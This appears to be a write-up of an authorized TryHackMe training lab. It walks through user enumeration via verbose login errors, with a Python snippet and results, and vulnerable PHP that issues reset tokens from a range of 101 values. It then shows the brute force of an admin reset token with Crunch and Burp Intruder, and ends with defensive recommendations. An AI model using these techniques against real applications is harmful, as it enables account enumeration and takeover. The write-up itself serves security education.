
# Authentication Security Assessment: User Enumeration via Verbose Errors and Password Reset Token Analysis

## Overview

This project demonstrates the security risks associated with verbose authentication error messages and weak password reset implementations. During the assessment, I identified user enumeration vulnerabilities caused by inconsistent login error responses and analyzed a password reset mechanism that relied on predictable numeric tokens.

The assessment showed how attackers can leverage verbose error messages to identify valid user accounts and combine this information with weak password reset mechanisms to compromise user accounts. Additionally, I demonstrated how predictable password reset tokens significantly reduce the security of account recovery workflows.

---

## Objectives

The objectives of this assessment were to:

* Identify user enumeration vulnerabilities in authentication workflows.
* Analyze verbose error messages for information disclosure.
* Automate username/email enumeration processes.
* Evaluate password reset token generation mechanisms.
* Demonstrate the security impact of predictable reset tokens.
* Recommend defensive controls to mitigate authentication weaknesses.

---

# Environment

| Component           | Details                                |
| ------------------- | -------------------------------------- |
| Platform            | TryHackMe Authentication Security Lab  |
| Operating System    | Kali Linux                             |
| Testing Environment | Authorized Training Lab                |
| Assessment Type     | Web Application Authentication Testing |

---

# Tools Used

* Burp Suite Community Edition
* Python 3
* Requests Library
* Crunch
* Firefox Browser
* Linux Command Line Utilities

---

# Phase 1: Authentication Error Analysis

## Objective

Determine whether the application exposes sensitive information through verbose authentication responses.

### Testing Procedure

I tested the login functionality using both valid and invalid email addresses while monitoring the application's responses.

### Observed Behavior

When submitting a non-existent email address, the application returned:

```text
Email does not exist
```

When submitting an existing email address with an incorrect password, the application returned:

```text
Invalid password
```

### Finding

The application disclosed whether an account existed based on differing error messages, enabling user enumeration attacks.

### Security Impact

This vulnerability allows attackers to:

* Enumerate valid user accounts.
* Reduce brute-force attack complexity.
* Conduct targeted phishing attacks.
* Identify privileged accounts.

---

# Phase 2: Automated User Enumeration

## Objective

Automate the discovery of valid email accounts.

### Methodology

A Python script was developed to submit authentication requests and analyze server responses for indicators of valid accounts.

### Enumeration Logic

```python
if response_json['status'] == 'error' and invalid_error in response_json['message']:
    print(f"[INVALID]{email}")
else:
    print(f"[VALID]{email}")
```

### Execution

```bash
python3 script.py usernames_gmail.com.txt
```

### Results

```bash
[INVALID] tharris@gmail.com
[INVALID] tmartin@gmail.com
[INVALID] tthompson@gmail.com
[INVALID] tgarcia@gmail.com
[INVALID] tmartinez@gmail.com
[INVALID] trobinson@gmail.com
[INVALID] tclark@gmail.com
[INVALID] trodriguez@gmail.com
[INVALID] tlewis@gmail.com
[INVALID] tlee@gmail.com
[INVALID] twalker@gmail.com
[INVALID] thall@gmail.com
[INVALID] trussell@gmail.com
[INVALID] tgriffin@gmail.com

Valid emails found:
canderson@gmail.com
```

### Finding

The authentication mechanism was vulnerable to automated account enumeration through response differentiation.

---

# Phase 3: Password Reset Security Assessment

## Objective

Evaluate the security of the password recovery workflow.

### Vulnerable Implementation

The application generated password reset tokens using a predictable numeric range:

```php
$token = mt_rand(100, 200);
$query = $conn->prepare("UPDATE users SET reset_token = ? WHERE email = ?");
$query->bind_param("ss", $token, $email);
$query->execute();
```

### Security Issue

The reset token space consisted of only 101 possible values:

```text
100-200
```

This dramatically reduced the complexity required for brute-force attacks.

---

# Phase 4: Predictable Token Exploitation

## Objective

Determine whether password reset tokens could be brute-forced.

### Password Reset Request

A password reset request was submitted for:

```text
admin@admin.com
```

The application generated a reset URL similar to:

```text
http://enum.thm/labs/predictable_tokens/reset_password.php?token=123
```

---

## Token Wordlist Generation

Using Crunch, I generated all possible token values:

```bash
crunch 3 3 -o otp.txt -t %%% -s 100 -e 200
```

### Output

```bash
Crunch will now generate the following number of lines: 101

crunch: 100% completed generating output
```

---

## Burp Suite Intruder Attack

The password reset request was captured and sent to Burp Suite Intruder.

### Attack Configuration

* Attack Type: Sniper
* Payload Position: token parameter
* Payload Source: otp.txt
* Payload Range: 100–200

---

## Successful Token Discovery

A successful response was identified by observing a significantly larger response size.

### Successful Response

```http
HTTP/1.1 200 OK
Content-Length: 789
```

The response disclosed:

```html
Your new password is: kjcAWT2C
Email: admin@admin.com
```

### Finding

The password reset mechanism was vulnerable to brute-force attacks due to:

* Low entropy token generation.
* Predictable numeric token ranges.
* Lack of rate limiting.
* No account lockout protections.

---

# Risk Assessment

| Vulnerability                 | Severity |
| ----------------------------- | -------- |
| User Enumeration              | Medium   |
| Verbose Authentication Errors | Medium   |
| Predictable Reset Tokens      | Critical |
| Weak Password Reset Workflow  | Critical |

---

# Security Recommendations

## Authentication Controls

* Implement generic authentication error messages.
* Prevent account enumeration through uniform responses.
* Introduce account lockout protections.
* Deploy adaptive rate limiting.

## Password Reset Security

* Use cryptographically secure random token generation.
* Generate tokens with at least 128 bits of entropy.
* Enforce short token expiration periods.
* Invalidate tokens immediately after use.
* Require HTTPS for all password reset operations.
* Implement request throttling and monitoring.

## Monitoring

* Log failed authentication attempts.
* Alert on abnormal password reset activity.
* Detect enumeration and brute-force patterns.

---

# Key Lessons Learned

This assessment demonstrated that seemingly minor implementation decisions can introduce significant security risks. Verbose authentication responses can facilitate account discovery, while predictable password reset tokens can completely undermine account recovery security controls. Secure authentication workflows require both robust cryptographic practices and careful error handling.

---

# Skills Demonstrated

* Web Application Security Testing
* Authentication Security Assessment
* User Enumeration
* Password Reset Security Analysis
* Burp Suite Intruder
* Python Automation
* HTTP Traffic Analysis
* Brute Force Methodology
* Vulnerability Assessment
* Security Reporting


---
## Disclaimer

> **Ethical Use Notice:** This assessment was conducted in an authorized training environment as part of a cybersecurity lab exercise. All testing activities were performed within controlled systems specifically designed for security education and defensive security training. No unauthorized systems or accounts were targeted.

